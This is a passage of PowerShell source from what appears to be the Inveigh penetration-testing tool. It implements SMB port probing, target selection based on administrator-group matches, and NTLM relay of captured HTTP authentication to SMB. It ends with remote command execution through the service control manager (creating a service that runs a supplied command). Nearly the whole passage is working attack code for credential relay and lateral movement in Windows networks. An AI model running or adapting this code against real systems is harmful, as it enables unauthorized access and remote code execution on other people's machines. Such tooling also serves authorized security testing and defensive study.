$inveigh.enumerate[$i].\"DNS Domain\" = $DNS_domain_name\n                    $inveigh.enumerate[$i].\"netBIOS Domain\" = $netBIOS_domain_name\n                    break\n                }\n\n            }\n\n        }\n\n        return $NTLM_challenge\n    }\n\n    function Invoke-SMBConnect\n    {\n        param ($ProcessID,$SourceIP)\n\n        function Test-SMBPort\n        {\n            param ($target)\n            \n            try\n            {     \n                $SMB_target_test = New-Object System.Net.Sockets.TCPClient\n                $SMB_target_test_result = $SMB_target_test.BeginConnect($target,\"445\",$null,$null)\n                $SMB_port_test_success = $SMB_target_test_result.AsyncWaitHandle.WaitOne(100,$false)\n                $SMB_target_test.Close()\n\n                if($SMB_port_test_success)\n                {\n                    $SMB_server = $true\n                }\n                else\n                {\n                    $SMB_server = $false    \n                }\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].IP -eq $target)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n                if($target_index -and $inveigh.enumerate[$target_index].IP -eq $target)\n                {\n                    $inveigh.enumerate[$target_index].\"SMB Server\" = $SMB_server\n                    $inveigh.enumerate[$target_index].\"Targeted\" = $(Get-Date -format s)\n                }\n                else\n                {\n                    $inveigh.enumerate.Add((New-RelayEnumObject -IP $target -SMBServer $SMB_server -Targeted $(Get-Date -format s))) > $null\n                }\n\n                return $SMB_port_test_success\n            }\n            catch \n            {\n                return $false\n            }\n\n        }\n\n        function Invoke-SMBNegotiate\n        {\n            param ($Target)\n\n            $client = New-Object System.Net.Sockets.TCPClient\n            $client.Client.ReceiveTimeout = 60000\n            $client.Connect($target,\"445\")\n\n            try\n            {\n                $client_stream = $client.GetStream()\n                $stage = 'NegotiateSMB'\n                $client_receive = New-Object System.Byte[] 1024\n            }\n            catch\n            {\n                $error_message = $_.Exception.Message\n                $error_message = $error_message -replace \"`n\",\"\"\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage\") > $null\n                $stage = 'Exit'\n            }\n\n            while($stage -ne 'Exit')\n            {\n\n                try\n                {\n                \n                    switch ($stage)\n                    {\n\n                        'NegotiateSMB'\n                        {\n                            $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       \n                            $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version\n                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data\n                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                            $client_stream.Write($client_send,0,$client_send.Length) > $null\n                            $client_stream.Flush()    \n                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n\n                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')\n                            {\n                                $SMB2 = $false\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Negotiated SMB1 not supported\") > $null\n                                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Trying anonther target\") > $null\n                                $client.Close()\n                                $stage = 'Exit'\n                            }\n                            else\n                            {\n                                $SMB2 = $true\n                                $stage = 'NegotiateSMB2'\n                            }\n\n                            if($target -and [System.BitConverter]::ToString($client_receive[70]) -eq '03')\n                            {        \n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Signing is required on $target\") > $null\n                                $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] Trying another target\") > $null\n                                $signing = $true\n                                $client.Close()\n                                $stage = 'Exit'\n                            }\n                            else\n                            {\n                                $signing = $false    \n                            }\n\n                        }\n                        \n                        'NegotiateSMB2'\n                        { \n                            $tree_ID = 0x00,0x00,0x00,0x00\n                            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n                            $message_ID = 1\n                            $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  \n                            $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest\n                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                            $client_stream.Write($client_send,0,$client_send.Length) > $null\n                            $client_stream.Flush()    \n                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n                            $stage = 'Exit'\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target\") > $null\n                        }\n                    \n                    }\n\n                }\n                catch\n                {\n                    $error_message = $_.Exception.Message\n                    $error_message = $error_message -replace \"`n\",\"\"\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage\") > $null\n                    $stage = 'Exit'\n                }\n            \n            }\n            \n            return $client,$SMB2,$signing\n        }\n\n        function Test-SMBTarget\n        {\n            param([Array]$targets,[Int]$limit,[String]$initiator)\n\n            $filter_date = Get-Date\n\n            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n            {\n\n                if(!$inveigh.enumerate[$i].IP -or $inveigh.enumerate[$i].IP -eq $SourceIP -or $inveigh.enumerate[$i].Signing -or $inveigh.enumerate[$i].\"SMB2.1\" -eq $false -or \n                ($inveigh.enumerate[$i].\"SMB Server\" -eq $false -and (New-TimeSpan $inveigh.enumerate[$i].Targeted $filter_date).Minutes -lt $TargetRefresh))\n                {\n\n                    if($inveigh.enumerate[$i].IP)\n                    {\n                        $targets_excluded += @($inveigh.enumerate[$i].IP)\n                    }\n\n                }\n\n            }\n\n            if($targets -and $targets_excluded)\n            {\n                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_excluded -PassThru | Where-Object {$_.SideIndicator -eq \"<=\"}\n                $sessions_temp = $inveigh.session\n                \n                if($targets -and $inveigh.relay_history_table.$SourceIP -and\n                (Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq \"<=\"}))\n                {\n                    [Array]$targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq \"<=\"}\n                }\n                elseif($targets -and ($sessions_temp | Where-Object {$_.Status}))\n                {\n                    $targets_temp = $targets\n                    $targets = @()\n                    \n                    foreach($target_entry in $targets_temp)\n                    {\n                        \n                        $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'connected'})\n\n                        if($sessions -and $sessions.Count -lt $limit)\n                        {\n                            $targets += $target_entry\n                        }\n                        elseif($initiator)\n                        {\n                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Initiator -eq $initiator -and $_.Status -eq 'connected'})\n\n                            if($sessions -and $sessions.Count -lt $limit)\n                            {\n                                $targets += $target_entry\n                            }\n\n                        }\n\n                    }\n\n                    if(!$targets)\n                    {\n\n                        foreach($target_entry in $targets_temp)\n                        {\n                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'disconnected'})\n\n                            if($sessions)\n                            {\n                                $targets += $target_entry\n                            }\n\n                        }\n\n                    }\n                        \n                }\n                \n            }\n\n            if($targets -and $inveigh.target_list)\n            {\n                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.target_list -ExcludeDifferent -IncludeEqual -PassThru\n            }\n\n            $i = 0\n            $random_index_history = @()\n\n            while(!$target -and $i -lt $targets.Count)\n            {\n                $i++\n\n                if($targets.Count -eq 1)\n                {\n                    $target = $targets[0]\n                }\n                else\n                {\n                    $random_range = 0..($targets.Count - 1)\n                    $random_range_filtered = $random_range | Where-Object {$random_index_history -notcontains $_}\n\n                    if($random_range_filtered)\n                    {\n                        $random_index = Get-Random -InputObject $random_range_filtered\n                        $random_index_history += $random_index\n                        $target = $targets[$random_index]\n                    }\n\n                }\n\n                if($target -eq $SourceIP)\n                {\n                    $target = $null\n                }\n\n                if($target)\n                {\n                    $SMB_port_test_success = Test-SMBPort $target\n\n                    if($SMB_port_test_success)\n                    {\n                        $SMB_negotiate = Invoke-SMBNegotiate $target\n                        $client = $SMB_negotiate[0]\n                        $SMB2 = $SMB_negotiate[1]\n                        $signing = $SMB_negotiate[2]\n                        $SMB_server = $true\n\n                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                        {\n\n                            if($inveigh.enumerate[$i].IP -eq $target)\n                            {\n                                $target_index = $i\n                                break\n                            }\n\n                        }\n\n                        $inveigh.enumerate[$target_index].\"SMB2.1\" = $SMB2\n                        $inveigh.enumerate[$target_index].Signing = $signing\n                        $inveigh.enumerate[$target_index].\"SMB Server\" = $SMB_server\n                        $inveigh.enumerate[$target_index].\"Targeted\" = $(Get-Date -format s)\n\n                        if(!$SMB2 -and $signing)\n                        {\n                            $target = $null\n                        }\n\n                    }\n                    else\n                    {\n                        $target = $null    \n                    }\n\n                }\n                \n            }\n            \n            return $client,$target\n        }\n\n        if($inveigh.target_list.Count -gt 1 -or (!$inveigh.target_list -and $inveigh.enumerate))\n        {\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Searching for a target\") > $null\n        }\n\n        try\n        {\n            $targets = $null\n            $target = $null\n\n            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n            {\n\n                if($inveigh.enumerate[$i].IP -eq $SourceIP -and $inveigh.enumerate[$i].Sessions)\n                {\n                    [Array]$initiator_sessions = $inveigh.enumerate[$i].Sessions\n                    break\n                }\n\n            }\n\n            $initiator_sessions = $initiator_sessions | Sort-Object {Get-Random}\n            \n            # check if sessions match any local admin group members\n            if($initiator_sessions)\n            {\n                \n                foreach($session in $initiator_sessions)\n                {\n\n                    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                    {\n\n                        if($inveigh.enumerate[$i].\"Administrator Users\" -contains $session -and $inveigh.enumerate[$i].IP)\n                        {\n                            $targets += @($inveigh.enumerate[$i].IP)\n                        }\n\n                    }\n\n                    if($targets)\n                    {\n                        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Administrator group match found for session $session on:\") > $null\n                        $inveigh.output_queue.Add(($targets -join \",\")) > $null\n                        $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv\n                        $client = $SMB_target_results[0]\n                        $target = $SMB_target_results[1]\n                    }\n\n                }\n\n            }\n\n            # check if sessions belong to groups that match any local admin group members\n            if($initiator_sessions -and !$targets -and !$target)\n            {\n\n                function Get-SessionGroup\n                {\n                    param($session)\n\n                    $group_list = @()\n                    $group_table_keys_temp = $inveigh.group_table.keys\n\n                    foreach($group in $group_table_keys_temp)\n                    {\n\n                        if($inveigh.group_table.$group -contains $session)\n                        {\n                            $group_list += $group\n                        }\n\n                    }\n\n                    for($i=0;$i -lt $group_list.Count;$i++)\n                    {\n                        \n                        foreach($group in $group_table_keys_temp)\n                        {\n\n                            if($inveigh.group_table.$group -contains $group_list[$i])\n                            {\n                                $group_list += $group\n                            }\n\n                        }\n\n                    }\n\n                    return $group_list\n                }\n\n                $session_groups = @()\n                $targets = @()\n\n                foreach($session in $initiator_sessions)\n                {\n                    $session_groups += Get-SessionGroup $session\n                }\n\n                if($session_groups)\n                {\n\n                    foreach($group in $session_groups)\n                    {\n\n                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                        {\n\n                            if($inveigh.enumerate[$i].\"Administrator Groups\" -contains $group -and $inveigh.enumerate[$i].IP)\n                            {\n                                $targets += @($inveigh.enumerate[$i].IP)\n                            }\n\n                        }\n\n                        if($targets)\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on:\") > $null\n                            $inveigh.output_queue.Add(($targets -join \",\")) > $null\n                            $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv\n                            $client = $SMB_target_results[0]\n                            $target = $SMB_target_results[1]\n                        }\n\n                    }\n\n                }\n\n            }\n\n            # check if source IP matches any netsessions\n            if(!$targets -and !$target -and $SourceIP)\n            {\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].NetSession -contains $SourceIP)\n                    {\n                        $targets += @($inveigh.enumerate[$i].IP)\n                    }\n\n                }\n\n                if($targets)\n                {\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] NetSession IP match found for $SourceIP on:\") > $null\n                    $inveigh.output_queue.Add(($targets -join \",\")) > $null\n                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv\n                    $client = $SMB_target_results[0]\n                    $target = $SMB_target_results[1]\n                }\n\n            }\n\n            # get list of systems with custom shares\n            if(!$targets -and !$target)\n            {\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].Shares)\n                    {\n                        $targets += @($inveigh.enumerate[$i].IP)\n                    }\n\n                }\n                                \n                if($targets)\n                {\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares:\") > $null\n                    $inveigh.output_queue.Add(($targets -join \",\")) > $null\n                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitShare $SourceIP\n                    $client = $SMB_target_results[0]\n                    $target = $SMB_target_results[1]\n                }\n\n            }\n\n            # get random target\n            if(!$target -and $TargetMode -eq 'Random')\n            {\n\n                if($inveigh.target_list.Count -gt 1)\n                {\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Selecting a random target\") > $null\n                }\n\n                if($inveigh.target_list)\n                {\n                    $SMB_target_results = Test-SMBTarget $inveigh.target_list $SessionLimitUnpriv\n                }\n                else\n                {\n                    $targets = @()\n                    $inveigh_enumerate.Count = $inveigh.enumerate.Count\n\n                    for($i=0; $i -lt $hostname_encoded.Count; $i++)\n                    {\n\n                        if($inveigh_enumerate[$i].Hostname)\n                        {\n                            $targets += $inveigh_enumerate[$i].Hostname\n                        }\n                        elseif($inveigh_enumerate[$i].IP)\n                        {\n                            $targets += $inveigh_enumerate[$i].IP\n                        }\n\n                    }\n\n                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv\n                }\n\n                $client = $SMB_target_results[0]\n                $target = $SMB_target_results[1]\n            }\n\n            if($target -and !$inveigh.relay_history_table.$SourceIP)\n            {\n                $inveigh.relay_history_table.Add($SourceIP,[Array]$target)\n            }\n            elseif($target -and $inveigh.relay_history_table.$SourceIP -notcontains $target)\n            {\n                $inveigh.relay_history_table.$SourceIP += $target\n            }\n\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        return $client,$target\n    }\n\n    function Invoke-SMBRelayChallenge\n    {\n        param ($client,$HTTP_request_bytes,$SMB_version,$SMB_process_ID)\n\n        try\n        {\n            $client_stream = $client.GetStream()\n            $client_receive = New-Object System.Byte[] 1024\n            $message_ID = 2\n            $tree_ID = 0x00,0x00,0x00,0x00\n            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]\n            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       \n            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate\n            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n            $client_stream.Write($client_send,0,$client_send.Length) > $null\n            $client_stream.Flush()    \n            $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        }\n\n        return $client_receive\n    }\n\n    function Invoke-SMBRelayResponse\n    {\n        param ($client,$HTTP_request_bytes,$SMB_version,$SMB_user_ID,$session_ID,$SMB_process_ID)\n    \n        try\n        {\n            $client_receive = New-Object System.Byte[] 1024\n\n            if($client)\n            {\n                $SMB_relay_response_stream = $client.GetStream()\n            }\n\n            $message_ID = 3\n            $tree_ID = 0x00,0x00,0x00,0x00\n            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n            $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes\n            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n            $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        \n            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth\n            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n            $SMB_relay_response_stream.Write($client_send,0,$client_send.Length) > $null\n            $SMB_relay_response_stream.Flush()\n            $SMB_relay_response_stream.Read($client_receive,0,$client_receive.Length) > $null\n            \n            if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00'))\n            {\n                $SMB_relay_failed = $false\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication successful for $HTTP_username_full on $Target\") > $null              \n            }\n            else\n            {\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].IP -eq $target)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n                $target_hostname = $inveigh.enumerate[$target_index].Hostname\n                $target_DNS_domain = $inveigh.enumerate[$target_index].\"DNS Domain\"\n\n                if($FailedLoginStrict -eq 'Y' -or ($HTTP_NTLM_domain_string -and ((!$target_hostname -or !$target_DNS_domain) -or ($target_hostname -and $target_DNS_domain -and $target_hostname -ne $target_DNS_domain))))\n                {\n\n                    if(!$inveigh.relay_failed_login_table.ContainsKey($HTTP_username_full))\n                    {\n                        $inveigh.relay_failed_login_table.Add($HTTP_username_full,[Array]$target)\n                    }\n                    else\n                    {\n                        $inveigh.relay_failed_login_table.$HTTP_username_full += $target\n                    }\n\n                }\n\n                $SMB_relay_failed = $true\n                $client.Close()\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication failed for $HTTP_username_full on $Target\") > $null\n            }\n\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            $SMB_relay_failed = $true\n        }\n\n        return $SMB_relay_failed\n    }\n\n    function Get-StatusPending\n    {\n        param ([Byte[]]$Status)\n\n        if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')\n        {\n            $status_pending = $true\n        }\n\n        return $status_pending\n    }\n    \n    function Invoke-SMBRelayExecute\n    {\n        param ($client,$SMB_version,$SMB_user_ID,$session_ID,$SMB_process_ID,$AccessCheck)\n\n        $client_receive = New-Object System.Byte[] 1024\n\n        if(!$Service)\n        {\n            $SMB_service_random = [String]::Join(\"00-\",(1..20 | ForEach-Object{\"{0:X2}-\" -f (Get-Random -Minimum 65 -Maximum 90)}))\n            $SMB_service = $SMB_service_random -replace \"-00\",\"\"\n            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)\n            $SMB_service = $SMB_service.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)\n            $SMB_service_random += '00-00-00-00-00'\n            $SMB_service_bytes = $SMB_service_random.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}   \n        }\n        else\n        {\n            $SMB_service = $Service\n            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($Service)\n\n            if([Bool]($SMB_service.Length % 2))\n            {\n                $SMB_service_bytes += 0x00,0x00\n            }\n            else\n            {\n                $SMB_service_bytes += 0x00,0x00,0x00,0x00\n            \n            }\n\n        }\n\n        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)\n        $Command = \"%COMSPEC% /C `\"\" + $Command + \"`\"\"\n        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += \"{0:X2}-00-\" -f $_}\n\n        if([Bool]($Command.Length % 2))\n        {\n            $SMBExec_command += '00-00'\n        }\n        else\n        {\n            $SMBExec_command += '00-00-00-00'\n        }    \n    \n        $SMBExec_command_bytes = $SMBExec_command.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  \n        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)\n        $SMB_path = \"\\\\\" + $Target + \"\\IPC$\"\n        $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)\n        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03\n        $client_stream = $client.GetStream()\n        $SMB_split_index = 4256\n        $stage = 'TreeConnect'\n        $message_ID =  $inveigh.session_message_ID_table[$inveigh.session_count]\n\n        while ($stage -ne 'Exit')\n        {\n\n            try\n            {\n                \n                switch ($stage)\n                {\n        \n                    'CheckAccess'\n                    {\n                        \n                        if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')\n                        {\n                            $SMB_service_manager_context_handle = $client_receive[108..127]\n                            $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes\n                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $target\") > $null\n\n                            if($inveigh.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))\n                            {\n                                $privileged_user = ($HTTP_NTLM_user_string + \"@\" + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string).ToUpper()\n                            }\n                            else\n                            {\n                                $privileged_user = $HTTP_username_full\n                            }\n\n                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                            {\n\n                                if($inveigh.enumerate[$i].IP -eq $target)\n                                {\n                                    $target_index = $i\n                                    break\n                                }\n\n                            }\n\n                            [Array]$privileged_user_list = $inveigh.enumerate[$target_index].Privileged\n                            \n                            if($privileged_user_list -notcontains $privileged_user)\n                            {\n                                $privileged_user_list += $privileged_user\n                                $inveigh.enumerate[$target_index].Privileged = $privileged_user_list\n                            }\n\n                            if($AccessCheck)\n                            {\n                                $SMB_administrator = $true\n                                $SMB_close_service_handle_stage = 2\n                                $stage = 'CloseServiceHandle'\n                            }\n                            elseif($SCM_data.Length -lt $SMB_split_index)\n                            {\n                                $stage = 'CreateServiceW'\n                            }\n                            else\n                            {\n                                $stage = 'CreateServiceW_First'\n                            }\n\n                        }\n                        elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')\n                        {\n                            \n                            if($Attack -notcontains 'Session')\n                            {\n                                $SMB_relay_failed = $true\n                            }\n\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_username_full does not have command execution privilege on $Target\") > $null\n                            $SMB_service_manager_context_handle = $client_receive[108..127]\n                            $SMB_close_service_handle_stage = 2\n                            $message_ID++\n                            $stage = 'CloseServiceHandle'\n                        }\n                        else\n                        {\n                            $SMB_relay_failed = $true\n                        }\n\n                    }\n\n                    'CloseRequest'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CloseServiceHandle'\n                    {\n\n                        if($SMB_close_service_handle_stage -eq 1)\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Service $SMB_service deleted on $Target\") > $null\n                            $SMB_close_service_handle_stage++\n                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle\n                        }\n                        else\n                        {\n                            $stage = 'CloseRequest'\n                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle\n                        }\n\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data \n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CreateRequest'\n                    {\n                        $tree_ID = $client_receive[40..43]\n                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\svcctl\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes\n                        $packet_SMB2_data[\"Share_Access\"] = 0x07,0x00,0x00,0x00  \n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                        $stage = 'SendReceive'\n                    }\n            \n                    'CreateServiceW'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = 